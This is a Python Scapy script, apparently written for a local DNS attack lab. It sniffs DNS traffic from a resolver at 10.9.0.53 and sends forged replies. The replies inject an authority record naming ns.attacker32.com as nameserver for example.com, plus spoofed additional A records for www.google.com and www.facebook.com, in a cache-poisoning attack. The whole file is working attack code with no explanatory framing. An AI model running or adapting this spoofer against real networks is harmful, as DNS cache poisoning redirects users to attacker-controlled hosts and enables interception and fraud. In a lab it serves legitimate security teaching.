#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
    if NS_NAME in pkt[DNS].qd.qname.decode():
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        
        # Create an IP object
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        
        # Create a UDP object
        udp = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport) 
        
        # Create an answer record
        #ansec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A',
        #    ttl = 1024, rdata = '1.2.3.4')
            
        # Create an authority record
        nssec1 = DNSRR(rrname = 'example.com', type = 'NS',
            ttl = 1024, rdata = 'ns.attacker32.com')
            
        nssec2 = DNSRR(rrname = 'example.com', type = 'NS',
            ttl = 1024, rdata = 'www.google.com')
      
        # Create an additional record
        arsec1 = DNSRR(rrname = 'www.google.com', type = 'A',
            ttl = 1024, rdata = '5.6.7.8')            
        arsec2 = DNSRR(rrname = 'www.facebook.com', type = 'A',
            ttl = 1024, rdata = '3.4.5.6')
        
        # Create a DNS object 
        dns = DNS(id = pkt[DNS].id,
            rd = 0, qr = 1, qdcount = 1, ancount = 0, nscount = 2, arcount = 2,
            qd = pkt[DNS].qd, ns = nssec1 / nssec2, ar = arsec1 / arsec2)
            #qd = pkt[DNS].qd, an = ansec, ns = nssec1 / nssec2, ar = arsec1 / arsec2 / arsec3) 
        
        # Send the spoofed DNS packet
        send(ip / udp / dns, verbose=0) 

myFilter = "udp port 53 && src host 10.9.0.53 && (not ether host 02:42:82:ce:39:30)"
print('running...')
sniff(iface='br-eb50d439f380', filter=myFilter, prn=spoof_dns)